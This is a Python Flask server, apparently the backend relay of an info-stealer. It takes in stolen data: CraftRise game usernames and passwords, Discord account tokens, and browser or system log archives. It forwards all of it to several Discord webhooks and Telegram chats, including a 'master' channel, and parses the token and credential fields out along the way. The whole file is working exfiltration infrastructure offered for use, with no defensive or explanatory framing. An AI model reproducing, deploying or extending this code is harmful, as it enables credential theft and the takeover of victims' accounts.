from flask import Flask, request, jsonify
import requests
import json
import os
import re
from datetime import datetime

app = Flask(__name__)

# Environment variables
WEBHOOK = os.environ.get("WEBHOOK", "")
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")

DISCORD_WEBHOOK = os.environ.get("DISCORD_WEBHOOK", "")
DISCORD_TELEGRAM_TOKEN = os.environ.get("DISCORD_TELEGRAM_TOKEN", "")
DISCORD_TELEGRAM_CHAT_ID = os.environ.get("DISCORD_TELEGRAM_CHAT_ID", "")

CRAFTRISE_WEBHOOK = os.environ.get("CRAFTRISE_WEBHOOK", "")
CRAFTRISE_TELEGRAM_TOKEN = os.environ.get("CRAFTRISE_TELEGRAM_TOKEN", "")
CRAFTRISE_TELEGRAM_CHAT_ID = os.environ.get("CRAFTRISE_TELEGRAM_CHAT_ID", "")

MASTER_WEBHOOK = os.environ.get("MASTER_WEBHOOK", "")
MASTER_TELEGRAM_TOKEN = os.environ.get("MASTER_TELEGRAM_TOKEN", "")
MASTER_TELEGRAM_CHAT_ID = os.environ.get("MASTER_TELEGRAM_CHAT_ID", "")

def clean_text(text):
    if not text: return ""
    text = re.sub(r'<a?:[a-zA-Z0-9_]+:\d+>', '', str(text))
    text = text.replace("**", "").replace("`", "").replace("*", "").replace("\\_", "_")
    text = text.replace("@everyone", "").replace("@here", "")
    return text.strip()

def send_telegram_msg(token, chat_id, msg):
    if not (token and chat_id and msg): return
    try:
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        requests.post(url, json={"chat_id": chat_id, "text": msg}, timeout=30)
    except Exception as e:
        print(f"[-] Telegram Mesaj Hatası: {e}")

def send_telegram_file(token, chat_id, file_bytes, filename="backup.zip"):
    if not (token and chat_id and file_bytes): return
    try:
        url = f"https://api.telegram.org/bot{token}/sendDocument"
        files = {'document': (filename, file_bytes)}
        requests.post(url, data={"chat_id": chat_id}, files=files, timeout=60)
    except Exception as e:
        print(f"[-] Telegram Dosya Hatası: {e}")

def send_discord_embed(url, embed_data):
    if not url: return
    try:
        requests.post(url, json=embed_data, timeout=30)
    except Exception as e:
        print(f"[-] Discord Embed Hatası: {e}")

def send_discord_with_file(url, content, file_bytes, filename="log.zip"):
    if not url or not file_bytes: return
    try:
        files = {'file': (filename, file_bytes)}
        requests.post(url, data={'content': content}, files=files, timeout=60)
    except Exception as e:
        print(f"[-] Discord Dosya Hatası: {e}")

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        # Veri tespiti (JSON veya Form)
        if request.is_json:
            data = request.get_json()
            file_bytes = None
        else:
            data = request.form.to_dict()
            file_bytes = request.files.get('file').read() if request.files.get('file') else None
            for key in ['embeds', 'creds']:
                if key in data and isinstance(data[key], str):
                    try: data[key] = json.loads(data[key])
                    except: pass

        log_type = data.get("type", "unknown")
        print(f"[{datetime.now()}] Type: {log_type}")

        # ============ CRAFTRISE ============
        if log_type == "craftrise":
            # 1. Özel Webhook'a (Zengin)
            send_discord_embed(CRAFTRISE_WEBHOOK, data)
            
            # 2. Telegram'a (Sade)
            creds = data.get("creds", {})
            user = creds.get("username", "Unknown") if isinstance(creds, dict) else "Unknown"
            pw = creds.get("password", "Unknown") if isinstance(creds, dict) else "Unknown"
            clean_msg = f"{user}:{pw}"
            
            # Özel Telegram kanallarına
            send_telegram_msg(CRAFTRISE_TELEGRAM_TOKEN, CRAFTRISE_TELEGRAM_CHAT_ID, clean_msg)
            # Genel Kanallara
            send_telegram_msg(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID, clean_msg)
            send_telegram_msg(MASTER_TELEGRAM_TOKEN, MASTER_TELEGRAM_CHAT_ID, clean_msg)

        # ============ DISCORD TOKEN ============
        elif log_type == "discord":
            # 1. Özel Webhook'a
            send_discord_embed(DISCORD_WEBHOOK, data)
            
            # 2. Telegram'a (Süreksiz Düz Token)
            token_val = data.get("token_val")
            if not token_val:
                # Eğer embed içinde varsa oradan çekmeyi dene
                embeds = data.get("embeds", [])
                if embeds and isinstance(embeds, list):
                    desc = embeds[0].get("description", "")
                    # Genelde token backtick içindedir
                    match = re.search(r'`([A-Za-z0-9._-]+)`', desc)
                    if match: token_val = match.group(1)
            
            final_token = token_val if token_val else "Unknown Token"
            send_telegram_msg(DISCORD_TELEGRAM_TOKEN, DISCORD_TELEGRAM_CHAT_ID, final_token)
            send_telegram_msg(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID, final_token)
            send_telegram_msg(MASTER_TELEGRAM_TOKEN, MASTER_TELEGRAM_CHAT_ID, final_token)

        # ============ BROWSER / SYSTEM / MASTER ============
        else:
            content_text = clean_text(data.get("content", ""))
            
            # Discord'a gönder
            if file_bytes:
                send_discord_with_file(MASTER_WEBHOOK, data.get("content", ""), file_bytes)
                send_discord_with_file(WEBHOOK, data.get("content", ""), file_bytes)
                send_telegram_file(MASTER_TELEGRAM_TOKEN, MASTER_TELEGRAM_CHAT_ID, file_bytes)
                send_telegram_file(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID, file_bytes)
            else:
                send_discord_embed(MASTER_WEBHOOK, data)
                send_discord_embed(WEBHOOK, data)
            
            # Telegram Mesajı
            final_msg = f"Target: {content_text.split('Target ID:')[-1].strip() if 'Target ID:' in content_text else content_text}\n"
            embeds = data.get("embeds", [])
            if isinstance(embeds, list):
                for embed in embeds:
                    title = clean_text(embed.get("title", ""))
                    if title: final_msg += f"\n--- {title} ---\n"
                    fields = embed.get("fields", [])
                    if isinstance(fields, list):
                        for field in fields:
                            name = clean_text(field.get("name", ""))
                            val = clean_text(field.get("value", ""))
                            # Link temizlik
                            link_match = re.search(r'\[.*?\]\((https?://.*?)\)', field.get("value", ""))
                            if link_match: val = link_match.group(1)
                            # RAM bar temizlik
                            if "[" in val and "]" in val and ("█" in val or "░" in val):
                                bar_match = re.search(r'\]\s*([\d.]+\%)', val)
                                val = bar_match.group(1) if bar_match else val.split(']')[-1].strip()
                            
                            final_msg += f"{name}: {val}\n"
                    if embed.get("url") and embed.get("url") != "#":
                        final_msg += f"URL: {embed['url']}\n"

            send_telegram_msg(MASTER_TELEGRAM_TOKEN, MASTER_TELEGRAM_CHAT_ID, final_msg.strip())
            send_telegram_msg(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID, final_msg.strip())

        return jsonify({"status": "ok"}), 200
    except Exception as e:
        print(f"[-] Hata: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/')
def home(): return "Proxy Active"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
